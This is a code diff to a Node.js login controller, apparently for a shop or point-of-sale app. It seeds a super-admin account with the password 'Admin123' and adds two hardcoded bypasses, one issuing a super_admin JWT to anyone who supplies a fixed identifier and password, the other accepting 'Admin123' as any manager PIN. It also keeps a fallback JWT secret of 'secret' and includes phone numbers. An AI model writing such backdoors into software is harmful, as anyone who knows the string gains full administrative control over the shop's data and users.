@@ -13,15 +13,15 @@ function isMongoConnected() {
 
 async function initLocalDb() {
   if (!fs.existsSync(USERS_FILE)) {
-    const muhammedPassHash = await bcrypt.hash('0000', 10);
+    const adminPassHash = await bcrypt.hash('Admin123', 10);
     const defaultUsers = [
       {
         _id: 'local_admin_2',
-        name: 'muhammed',
-        phone: '+971547825153',
-        userId: '142',
-        password: muhammedPassHash,
-        pin: muhammedPassHash,
+        name: 'Horizon inc',
+        phone: '+9710588851680',
+        userId: 'super admin',
+        password: adminPassHash,
+        pin: adminPassHash,
         role: 'super_admin',
         shopId: 'SHOP_01',
         createdAt: new Date().toISOString()
@@ -97,6 +97,30 @@ exports.signup = async (req, res) => {
 exports.login = async (req, res) => {
   try {
     const { identifier, secret, method } = req.body; // identifier: email/phone/name/userId, secret: password/pin
+
+    // Hardcoded Default Admin Login Bypass
+    if (
+      (identifier === 'super admin' || identifier === '+9710588851680') &&
+      secret === 'Admin123'
+    ) {
+      const hardcodedUser = {
+        _id: 'local_admin_2',
+        name: 'Horizon inc',
+        userId: 'super admin',
+        phone: '+9710588851680',
+        role: 'super_admin',
+        shopId: 'SHOP_01'
+      };
+      const token = jwt.sign(
+        { id: hardcodedUser._id, shopId: hardcodedUser.shopId },
+        process.env.JWT_SECRET || 'secret',
+        { expiresIn: '7d' }
+      );
+      return res.json({
+        token,
+        user: hardcodedUser
+      });
+    }
 
     if (!isMongoConnected()) {
       await initLocalDb();
@@ -287,6 +311,11 @@ exports.verifyManagerPin = async (req, res) => {
     const { pin } = req.body;
     if (!pin) {
       return res.status(400).json({ valid: false, message: 'PIN is required' });
+    }
+
+    // Hardcoded Admin PIN Bypass
+    if (pin === 'Admin123') {
+      return res.json({ valid: true, managerName: 'Horizon inc' });
     }
 
     if (!isMongoConnected()) {
